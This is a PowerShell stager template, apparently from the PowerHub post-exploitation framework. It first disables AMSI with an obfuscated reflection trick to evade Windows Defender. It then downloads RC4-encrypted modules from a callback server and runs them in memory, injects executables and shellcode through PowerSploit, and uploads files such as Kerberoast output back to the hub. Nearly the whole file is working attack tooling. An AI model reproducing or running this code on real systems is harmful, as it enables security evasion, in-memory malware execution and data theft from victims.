$ErrorActionPreference = "Stop"
$CALLBACK_URL = "{{callback_url}}"
$KEY = ([system.Text.Encoding]::UTF8).GetBytes("{{key}}")
$PS_VERSION = $PSVersionTable.PSVersion.Major

Write-Host @"
  _____   _____  _  _  _ _______  ______ _     _ _     _ ______
 |_____] |     | |  |  | |______ |_____/ |_____| |     | |_____]
 |       |_____| |__|__| |______ |    \_ |     | |_____| |_____]
                            written by Adrian Vollmer, 2018-2019
Run 'Help-PowerHub' for help
"@

Try {
    # Bypass Win10 Defender, no admin required
    # Reqires some obfuscation
    [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiSySSFailed'.replace('SySS','Init'),'NonPublic,Static').SetValue($null,$true)
    Write-Host "[+] Disabled AMSI"
} Catch {
    Write-Host "[-] Failed to disable AMSI"
}



$Modules = @()
{% if modules %}
{% for m in modules %}
$m = new-object System.Collections.Hashtable
$m.add('name', '{{ m.name }}')
$m.add('type', '{{ m.type }}')
$m.add('code', '')
$m.add('n', {{ m.n }})
$Modules += $m
{% endfor %}
{% endif %}

function Decrypt-Code {
    # RC4
    param(
        [Byte[]]$buffer,
        [Byte[]]$key
  	)

    $s = New-Object Byte[] 256;
    $k = New-Object Byte[] 256;

    for ($i = 0; $i -lt 256; $i++)
    {
        $s[$i] = [Byte]$i;
        $k[$i] = $key[$i % $key.Length];
    }

    $j = 0;
    for ($i = 0; $i -lt 256; $i++)
    {
        $j = ($j + $s[$i] + $k[$i]) % 256;
        $temp = $s[$i];
        $s[$i] = $s[$j];
        $s[$j] = $temp;
    }

    $i = $j = 0;
    for ($x = 0; $x -lt $buffer.Length; $x++)
    {
        $i = ($i + 1) % 256;
        $j = ($j + $s[$i]) % 256;
        $temp = $s[$i];
        $s[$i] = $s[$j];
        $s[$j] = $temp;
        [int]$t = ($s[$i] + $s[$j]) % 256;
        $buffer[$x] = $buffer[$x] -bxor $s[$t];
    }

    $buffer
}

function Unzip-Code {
     Param ( [byte[]] $byteArray )
     if ($PS_VERSION -eq 2) {
        $byteArray
     } else {
         $input = New-Object System.IO.MemoryStream( , $byteArray )
         $output = New-Object System.IO.MemoryStream
         $gzipStream = New-Object System.IO.Compression.GzipStream $input, ([IO.Compression.CompressionMode]::Decompress)
         $gzipStream.CopyTo( $output )
         $gzipStream.Close()
         $input.Close()
         [byte[]] $byteOutArray = $output.ToArray()
         $byteOutArray
    }
}


function Import-HubModule {

    Param(
        [parameter(Mandatory=$true)]
        $Module
    )

    if ($Module["type"] -eq "ps1") {
        $code = $Module["code"]
        $code = [System.Convert]::FromBase64String($code)
        $code = Decrypt-Code $code $KEY
        $code = Unzip-Code $code
        $code = [System.Text.Encoding]::ASCII.GetString($code)
        $sb = [Scriptblock]::Create($code)
        New-Module -ScriptBlock $sb | Out-Null
    }

    if ($?){
        Write-Host ("[*] {0} imported." -f $Module["name"])
    } else {
        Write-Host ("[*] Failed to import {0}" -f $Module["name"])
    }
}


function Convert-IntStringToArray ($s) {
    $no = $s.Split(",")
    $indices = @()
    foreach ($t in $no) {
        $limits = $t.Split("-")
        if ($limits.Length -eq 1) {
            $indices += $limits[0]
        } else {
            if (-not $limits[0]) { $limits[0] = 0}
            if (-not $limits[1]) { $limits[1] = $Modules.length-1}
            $indices += $limits[0] .. $limits[1]
        }
    }
    $indices
}

function List-HubModules {
<#
.SYNOPSIS

Lists all modules that are available via the hub.

#>
    $(foreach ($ht in $Modules) {
        new-object PSObject -Property $ht
    } ) | Format-Table -AutoSize -Property n,type,name,code
}

function Load-HubModule {

<#
.SYNOPSIS

Transfers a module from the hub and imports it. It creates a web request to
load the Base64 encoded module code.

.DESCRIPTION

Load-HubModule loads a module.

.PARAMETER s

Number of the module, separated by commas. Can contain a range such as "1,4-8".
Try a leading zero in case it is not working.

.EXAMPLE

Load-HubModule "3"

Description
-----------
Transfers the code of module #3 from the hub and imports it.

.EXAMPLE

Load-HubModule "1,4-6"

Description
-----------
Transfers the code of modules #1, #4, #5 and #6 from the hub and imports them.

.EXAMPLE

Load-HubModule "-"

Description
-----------
Transfers the code of all modules from the hub and imports them.

.NOTES

Use the '-Verbose' option to print detailed information.
#>

    Param(
        [parameter(Mandatory=$true)]
        [String]
        $s
    )

    $indices = Convert-IntStringToArray($s)

    $K=new-object net.webclient;
    $K.proxy=[Net.WebRequest]::GetSystemWebProxy();
    $K.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;
    foreach ($i in $indices) {
        if ($i -lt $Modules.length -and $i -ge 0) {
            $compression = "&c=1"
            if ($PS_VERSION -eq 2) { $compression = "" }
            $url = "{0}?m={1}{2}" -f $CALLBACK_URL, $i, $compression
            $Modules[$i]["code"] = $K.downloadstring($url);
            Import-HubModule $Modules[$i]
        }
    }
}


function Run-Exe {
<#
.SYNOPSIS

Executes a loaded exe module in memory using Invoke-ReflectivePEInjection, which must be loaded first.

.EXAMPLE

Run-Exe 47

Description
-----------
Execute the exe module 47 in memory
#>
    Param(
        [parameter(Mandatory=$true)]
        [Int]
        $n
    )

    if (Get-Command "Invoke-ReflectivePEInjection" -errorAction SilentlyContinue)
    {
        $code = $Modules[$n]["code"]
        $code = [System.Convert]::FromBase64String($code)
        $code = Decrypt-Code $code $KEY
        $code = Unzip-Code $code
        Invoke-ReflectivePEInjection -PEBytes $code -ForceASLR
    } else {
        Write-Host "[-] PowerSploit's Invoke-ReflectivePEInjection not available. You need to load it first."
    }
}

function Run-Shellcode {
<#
.SYNOPSIS

Executes a loaded shellcode module in memory using Invoke-Shellcode, which must be loaded first.

.EXAMPLE

Run-Shellcode 47

Description
-----------
Execute the shellcode module 47 in memory
#>
    Param(
        [parameter(Mandatory=$true)]
        [Int]
        $n,

        [ValidateNotNullOrEmpty()]
        [UInt16]
        $ProcessID
    )

    if (Get-Command "Invoke-Shellcode" -errorAction SilentlyContinue)
    {
        $code = $Modules[$n]["code"]
        $code = [System.Convert]::FromBase64String($code)
        $code = Decrypt-Code $code $KEY
        $code = Unzip-Code $code
        if ($ProcessID) {
            Invoke-Shellcode -Shellcode $code -ProcessID $ProcessID
        } else {
            Invoke-Shellcode -Shellcode $code
        }
    } else {
        Write-Host "[-] PowerSploit's Invoke-Shellcode not available. You need to load it first."
    }
}


function PushTo-Hub {
<#
.SYNOPSIS

Uploads files back to the hub via Cmdlet.

.EXAMPLE

PushTo-Hub kerberoast.txt, users.txt

Description
-----------
Upload the files 'kerberoast.txt' and 'users.txt' via HTTP back to the hub.
#>
    Param(
       [Parameter(Mandatory=$True)]
       [String[]]$Files
    )

    ForEach ($file in $Files) {
        $abspath = (Resolve-Path $file).path
        $fileBin = [System.IO.File]::ReadAllBytes($abspath)
        $enc = [System.Text.Encoding]::GetEncoding("iso-8859-1")
        $fileEnc = $enc.GetString($fileBin)

        $boundary = [System.Guid]::NewGuid().ToString()
        $LF = "`r`n"

        $bodyLines = (
            "--$boundary",
            "Content-Disposition: form-data; name=`"file`"; filename=`"$file`"",
            "Content-Type: application/octet-stream$LF",
            $fileEnc,
            "--$boundary--$LF"
        ) -join $LF

        $url = $CALLBACK_URL.substring(0,$CALLBACK_URL.length-2)
        try {
            $response = Invoke-RestMethod -Uri $($url + "u") -Method "POST" -ContentType "multipart/form-data; boundary=`"$boundary`"" -Body $bodyLines
        } catch [System.Net.WebException] {
             if (-not $_.Exception.Message -match "401")  {throw $_}
        }
    }
}

function Help-PowerHub {
    Write-Host @"
The following functions are available:
  * List-HubModules
  * Load-HubModule
  * Run-Exe
  * Run-Shellcode
  * PushTo-Hub

Use 'Get-Help' to learn more about those functions.
"@
}



